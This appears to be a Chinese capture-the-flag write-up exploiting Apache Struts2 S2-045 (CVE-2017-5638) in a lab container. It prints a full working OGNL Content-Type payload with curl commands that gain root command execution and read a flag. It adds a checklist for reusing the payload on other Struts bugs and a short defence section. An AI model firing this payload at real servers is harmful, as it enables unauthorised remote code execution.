[Struts2]S2-045 实战 Writeup：同一个 OGNL 骨架，换到 Content-Type 头里

一、靶机信息与漏洞简介

• 靶机环境：Struts2（Vulhub 环境，s2-045 镜像），容器内 8080 映射到 26923 • 访问方式：nc direct-ctf2.dasctf.com 26923（端口映射，不是 shell） • 漏洞类型：Jakarta Multipart 解析器 OGNL 注入 → 远程代码执行（CVE-2017-5638 / S2-045） • 影响版本：Struts 2.3.5 – 2.3.31、2.5 – 2.5.10；修复版本 2.3.32 / 2.5.10.1 • 漏洞原理：文件上传请求的 Content-Type 头解析失败时，Struts 会把异常信息本身当作 OGNL 表达式求值， 于是写在头里的 %{...} 被直接执行。 • 与前一天那台 S2-048 的关系：它的注入点在 name 参数，这台的注入点在 Header， payload 主干完全一致，只是入口换了位置。

二、渗透过程详解

先说环境：这台的端口 refused 过两次
第一次开出 26481、第二次 29878，nc 都返回 Connection refused，curl 也连不上。 一度以为是命令写错，其实不是——先做了一次网络自检：

代码块


curl -sS -o /dev/null -w '%{http_code}\n' https://www.baidu.com
返回 200，说明本地网络正常，问题在平台侧的容器没把端口监听出来。 第三次重开拿到 26923，nc 立刻 open，才开始打。

这里有个值得记住的判据：

代码块


Connection refused  → 网络通，端口没有服务在听（服务端问题）
timeout / 卡住不返回 → 网络路径不通（可能是自己这边）
两者处理方向完全相反，别混着猜。

验证 OGNL 是否执行
payload 写在 Content-Type 头里，整段如下（实测可用）：

代码块


PAYLOAD="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

curl -sS -X POST "http://direct-ctf2.dasctf.com:26923/" \
     -H "Content-Type: $PAYLOAD" \
     --data "x=1" \
     -o /tmp/s2045.html -w 'HTTP %{http_code}\n'

grep -aoE 'uid=[^ ]*' /tmp/s2045.html | head -3
返回：

代码块


curl: (56) Recv failure: Connection reset by peer
HTTP 200
uid=0(root)
看到 uid=0(root) 就是打穿了。那句 Recv failure 不用管——payload 已经把进程输出 直接写进了响应流，我们自己劫持了连接，curl 那边自然认为连接异常中断。

换命令读 flag
整个 payload 只改一个地方：#cmd='id' 换成 #cmd='printenv FLAG'。

代码块


PAYLOAD="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='printenv FLAG').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

curl -sS -X POST "http://direct-ctf2.dasctf.com:26923/" \
     -H "Content-Type: $PAYLOAD" \
     --data "x=1" \
     -o /tmp/flag045.html -w 'HTTP %{http_code}\n'

grep -aoE '[A-Za-z0-9_]+\{[^}]{8,}\}' /tmp/flag045.html | head -3
返回：

代码块


HTTP 200
CTF2{99146e2a-a184-406d-ae86-7b50289561f6}
提交，+1 分。

三、和 S2-048 的对照：同一套骨架，两个入口

前一天刚打过 CVE-2017-9791（S2-048），两台的 payload 主干是同一串：

代码块


换 _memberAccess 为 DEFAULT_MEMBER_ACCESS
清空 OgnlUtil 的 excludedPackageNames 与 excludedClasses
ProcessBuilder 起 /bin/bash -c
IOUtils.copy 把 stdout 复制到 getResponse().getOutputStream()
差别只有两处：

• 入口不同：S2-048 在 name 表单字段里，S2-045 在 Content-Type 请求头里 • 触发时机不同：一个是参数绑定求值，一个是 multipart 解析失败时求值

另外 S2-045 的 payload 开头多一个 #nike='multipart/form-data'， 作用是在 OGNL 上下文里先塞一个变量，让解析器认这是 multipart 类型，从而走进有漏洞的分支。

结论：以后遇到 S2-016、S2-032、S2-057 这类，先找注入点在哪， 再把这套骨架搬过去，不需要一题背一个 payload。

四、踩坑记录

• curl 用了 -s：错误信息被一起吞掉，连接被拒时屏幕上什么都不显示，误以为"没反应"。 应当用 -sS（大写 S 保留报错）。 • 端口 refused 反复重开：这是平台容器没起来，不是本地问题。先做一次外网连通性自检， 确认自己没问题后，最多重开两次就换题，别在一台上耗掉半小时。 • Recv failure: Connection reset by peer：不是失败，是 payload 劫持响应流后的正常现象， 输出已经写进 -o 指定的文件里，去 grep 文件即可。 • 不需要真的构造 multipart 请求体。--data "x=1" 只是让请求是个合法 POST， 恶意内容全在 Header 里，解析器读头就会执行。 • payload 里有大量单引号、@ 符号、括号，写进 shell 变量时要用双引号包裹， 用单引号会把内部的 'id' 提前截断。

五、可复用 Checklist：Struts2 OGNL 类漏洞

认服务：curl -sS -i http://host:port/ | head，确认版本与页面特征。
判断注入点： multipart 解析相关 → 打 Content-Type 头（S2-045/046） 参数绑定相关 → 打表单字段（S2-048 的 name）
套通用骨架：换 _memberAccess → 清黑名单 → ProcessBuilder → IOUtils.copy 回显。
先用 id 验证，看到 uid= 再换业务命令。
取 flag 顺序：printenv FLAG → env | grep -i flag → /proc/1/environ → 常规目录。
输出重定向到文件再 grep，不要直接管道给 head。
六、防御视角

• 升级到 Struts 2.3.32 / 2.5.10.1 及以上，S2-045 已修复。 • WAF 拦 Content-Type 中的 OGNL 特征（%{、_memberAccess、ProcessBuilder、OgnlUtil）。 • 应用以最小权限运行：本题 Tomcat 是 root，拿到 RCE 就等于拿到整台机器。 • 不要用老旧版本的 struts2-showcase 示例应用对外提供服务，它本身就是攻击面。
